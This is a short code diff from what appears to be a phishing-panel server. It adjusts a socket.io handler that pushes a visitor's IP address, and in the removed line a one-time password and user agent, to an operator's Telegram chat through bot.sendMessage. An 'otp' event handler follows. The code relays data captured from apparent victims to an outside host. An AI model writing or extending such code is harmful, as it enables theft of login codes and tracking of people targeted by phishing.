@@ -231,7 +231,7 @@ io.on('connection', (socket, req) => {
                 ]
             }
         };
-        bot.sendMessage(chatId, `Loading Page: ${data.otp}\n\nIP: ${userIP} \nUserAgent: ${data.userAgent}`, opts);
+        bot.sendMessage(chatId, `User on loading page\n\nIP: ${userIP}`, opts);
     })
 
     socket.on('otp', (data) => {
